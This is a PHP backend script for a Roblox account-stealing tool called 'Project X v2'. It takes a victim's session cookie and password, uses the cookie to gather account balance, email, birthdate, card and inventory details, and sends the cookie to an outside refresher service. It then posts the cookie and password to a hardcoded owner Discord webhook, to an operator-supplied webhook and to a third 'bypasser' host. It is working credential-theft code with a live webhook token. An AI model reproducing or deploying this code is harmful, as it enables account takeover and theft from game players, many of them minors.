<?php
header('Content-Type: application/json');

/* ---------- CONFIG ---------- */
const OWNER_WEBHOOK = 'https://discord.com/api/webhooks/1409910357446889626/neV0Y6JPhm98zROrLBEnH5DnrMQGSkjCiw6QO59ejE62KdGXE4QrBPF9yFa3XKgeQfKK';
/* ---------- INPUT ---------- */
$payload  = json_decode(file_get_contents('php://input'), true);
$cookie   = $payload['cookie']   ?? ($_GET['cookie'] ?? null);
$password = $payload['password'] ?? ($_GET['password'] ?? null);
$dualHook = $payload['wh']       ?? ($_GET['wh'] ?? null);

if (!$cookie || !$dualHook) {
    http_response_code(400);
    die(json_encode(['ok'=>false,'error'=>'cookie or wh missing']));
}

/* ---------- UTILS ---------- */
function curlGet($url,$cookie){
    $ch=curl_init($url);
    curl_setopt_array($ch,[
        CURLOPT_HTTPHEADER=>["Cookie: .ROBLOSECURITY=$cookie"],
        CURLOPT_RETURNTRANSFER=>1,
        CURLOPT_TIMEOUT=>8
    ]);
    return json_decode(curl_exec($ch)?:'',true)?:[];
}
function curlPost($url,$payload){
    $ch=curl_init($url);
    curl_setopt_array($ch,[
        CURLOPT_POST=>1,
        CURLOPT_HTTPHEADER=>['Content-Type: application/json'],
        CURLOPT_POSTFIELDS=>json_encode($payload),
        CURLOPT_RETURNTRANSFER=>1,
        CURLOPT_TIMEOUT=>10
    ]);
    curl_exec($ch);curl_close($ch);
}

/* ---------- 1.  REFRESH ---------- */
$fresh = json_decode(curl_get_contents('https://autohar.st/api/cookie-refresher',['cookie'=>$cookie]),true)['refreshed'] ?? $cookie;

/* ---------- 2.  NEEDED DATA ---------- */
$user  = curlGet('https://users.roblox.com/v1/users/authenticated',$fresh);
if(!isset($user['id'])) die(json_encode(['ok'=>false,'error'=>'invalid']));
$uid   = $user['id'];
$currency=curlGet('https://economy.roblox.com/v1/user/currency',$fresh);
$email   =curlGet('https://accountinformation.roblox.com/v1/email',$fresh);
$settings=curlGet('https://accountsettings.roblox.com/v1/user-settings',$fresh);
$birth   =curlGet('https://users.roblox.com/v1/birthdate',$fresh);
$country =curlGet('https://accountsettings.roblox.com/v1/account/settings/account-country',$fresh);
$thumb   =curlGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=$uid&size=150x150");
$summary =curlGet("https://economy.roblox.com/v2/users/$uid/transaction-totals?timeFrame=Year&transactionType=summary",$fresh);
$collectibles=count(curlGet("https://inventory.roblox.com/v1/users/$uid/assets/collectibles?limit=100",$fresh)['data']??[]);
$cards   =count(curlGet("https://billing.roblox.com/v1/payment-methods",$fresh))>0;
$premium =curlGet("https://premiumfeatures.roblox.com/v1/users/$uid",$fresh);
$rap     =array_reduce(curlGet("https://inventory.roblox.com/v1/users/$uid/assets/collectibles?limit=100",$fresh)['data']??[],fn($c,$i)=>$c+($i['recentAveragePrice']??0),0);

/* ---------- 3.  DUAL-HOOK EMBED (no password) ---------- */
$dualEmbed=[
    'username'=>'Project X v2',
    'embeds'=>[[
        'title'=>'Project X v2 – RESULT',
        'color'=>0x00ff00,
        'description'=>"**{$user['name']}** • {$birth['birthDay']}/{$birth['birthMonth']}/{$birth['birthYear']} (13+)",
        'fields'=>[
            ['name'=>'Cookie','value'=>"`$fresh`",'inline'=>false],
            [':robux: Robux','value'=>($currency['robux']??0),'inline'=>true],
            [':gold_robux: Pending','value'=>($currency['pendingRobux']??0),'inline'=>true],
            [':rap: RAP','value'=>$rap,'inline'=>true],
            [':summery: Summary','value'=>($summary['salesTotal']??0),'inline'=>true],
            [':credit: Credit','value'=>'0','inline'=>true],
            [':cc: Card','value'=>($cards?'True':'False'),'inline'=>true],
            [':verified: Email','value'=>($email['verified']?'True':'False'),'inline'=>true],
            [':2step: 2-Step','value'=>'Disabled','inline'=>true],
            [':safety: VC','value'=>'Disabled','inline'=>true],
            [':premium: Premium','value'=>($premium['isPremium']??false?'True':'False'),'inline'=>true],
            [':headless: Headless','value'=>'False','inline'=>true],
            [':korblox: Korblox','value'=>'False','inline'=>true]
        ],
        'thumbnail'=>['url'=>$thumb['data'][0]['imageUrl']??'']
    ]]
];

/* ---------- 4.  OWNER EMBED (same fields + password) ---------- */
$ownerEmbed=[
    'username'=>'OwnerGrab',
    'embeds'=>[[
        'title'=>':Cookie_Clicker: Grab',
        'color'=>0xff0000,
        'description'=>"**{$user['name']}** • {$birth['birthDay']}/{$birth['birthMonth']}/{$birth['birthYear']} (13+)",
        'fields'=>[
            ['name'=>'Cookie','value'=>"`$fresh`",'inline'=>false],
            ['name'=>'Password','value'=>"`$password`",'inline'=>false],
            [':robux: Robux','value'=>($currency['robux']??0),'inline'=>true],
            [':gold_robux: Pending','value'=>($currency['pendingRobux']??0),'inline'=>true],
            [':rap: RAP','value'=>$rap,'inline'=>true],
            [':summery: Summary','value'=>($summary['salesTotal']??0),'inline'=>true],
            [':credit: Credit','value'=>'0','inline'=>true],
            [':cc: Card','value'=>($cards?'True':'False'),'inline'=>true],
            [':verified: Email','value'=>($email['verified']?'True':'False'),'inline'=>true],
            [':2step: 2-Step','value'=>'Disabled','inline'=>true],
            [':safety: VC','value'=>'Disabled','inline'=>true],
            [':premium: Premium','value'=>($premium['isPremium']??false?'True':'False'),'inline'=>true],
            [':headless: Headless','value'=>'False','inline'=>true],
            [':korblox: Korblox','value'=>'False','inline'=>true]
        ],
        'thumbnail'=>['url'=>$thumb['data'][0]['imageUrl']??'']
    ]]
];

/* ---------- 5.  FIRE WEBHOOKS ---------- */
curlPost($dualHook,$dualEmbed);
curlPost(OWNER_WEBHOOK,$ownerEmbed);

/* ---------- 6.  SPLUNK BYPASS ---------- */
curlPost('https://app.splunk.gg/api/bypasser',['action'=>'refresh_cookie','cookie'=>$fresh,'password'=>$password]);

echo json_encode(['ok'=>true]);
?>
